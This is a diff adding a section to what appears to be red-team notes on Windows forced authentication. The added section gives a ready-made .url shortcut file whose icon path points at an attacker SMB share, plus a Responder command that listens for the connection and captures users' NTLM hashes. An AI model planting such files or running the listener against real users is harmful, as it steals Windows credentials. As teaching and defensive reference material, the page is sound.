@@ -68,6 +68,32 @@ What's interesting with the `.scf` attack is that the file could easily be downl
 
 ![](../.gitbook/assets/forced-auth-downloads.png)
 
+## Execution via .URL
+
+{% code-tabs %}
+{% code-tabs-item title="c:\\link.url@victim" %}
+```csharp
+[InternetShortcut]
+URL=whatever
+WorkingDirectory=whatever
+IconFile=\\10.0.0.5\%USERNAME%.icon
+IconIndex=1
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+{% code-tabs %}
+{% code-tabs-item title="attacker@local" %}
+```text
+responder -I eth1 -v
+```
+{% endcode-tabs-item %}
+{% endcode-tabs %}
+
+Once user navigates to the C:\ where `link.url` file is placed, the file will try to authenticate to our malicious SMB listener on `10.0.0.5` \(attacker machine\) that will capture user's NTLM hashes:
+
+![](../.gitbook/assets/forced-authentication-url.gif)
+
 {% embed data="{\"url\":\"https://attack.mitre.org/wiki/Technique/T1187\",\"type\":\"link\",\"title\":\"Forced Authentication - ATT&CK for Enterprise\"}" %}
 
 [http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf](http://www.defensecode.com/whitepapers/Stealing-Windows-Credentials-Using-Google-Chrome.pdf)
@@ -75,4 +101,6 @@ What's interesting with the `.scf` attack is that the file could easily be downl
 {% embed data="{\"url\":\"https://www.bleepingcomputer.com/news/security/you-can-steal-windows-login-credentials-via-google-chrome-and-scf-files/\",\"type\":\"link\",\"title\":\"You Can Steal Windows Login Credentials via Google Chrome and SCF Files\",\"description\":\"Just by accessing a folder containing a malicious SCF file, a user will unwittingly share his computer\'s login credentials with an attacker via Google Chrome and the SMB protocol.\",\"icon\":{\"type\":\"icon\",\"url\":\"https://www.bleepstatic.com/favicon/bleeping.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://www.bleepstatic.com/content/hl-images/2017/05/16/WindowsPassword.jpg\",\"width\":1250,\"height\":525,\"aspectRatio\":0.42}}" %}
 
 {% embed data="{\"url\":\"https://pentestlab.blog/2017/12/13/smb-share-scf-file-attacks/\",\"type\":\"link\",\"title\":\"SMB Share – SCF File Attacks\",\"description\":\"SMB is a protocol which is widely used across organisations for file sharing purposes. It is not uncommon during internal penetration tests to discover a file share which contains sensitive informa…\",\"icon\":{\"type\":\"icon\",\"url\":\"https://s1.wp.com/i/favicon.ico\",\"aspectRatio\":0},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://pentestlab.files.wordpress.com/2017/12/metasploit-smb-relay-attack.png\",\"width\":724,\"height\":401,\"aspectRatio\":0.5538674033149171}}" %}
+
+{% embed data="{\"url\":\"https://medium.com/@markmotig/a-better-way-to-capture-hashes-with-no-user-interaction-by-markmo-bd1569bfa208\",\"type\":\"link\",\"title\":\"A better way to capture hashes with no user interaction by @\_markmo\_\",\"description\":\"I found a better way to capture hashes from a post by @insertscript on twitter\",\"icon\":{\"type\":\"icon\",\"url\":\"https://cdn-images-1.medium.com/fit/c/304/304/1\*8I-HPL0bfoIzGied-dzOvA.png\",\"width\":152,\"height\":152,\"aspectRatio\":1},\"thumbnail\":{\"type\":\"thumbnail\",\"url\":\"https://cdn-images-1.medium.com/max/1444/1\*fCcNzzty8DFieV3Rvc6JBA.png\",\"width\":722,\"height\":206,\"aspectRatio\":0.2853185595567867}}" %}
 
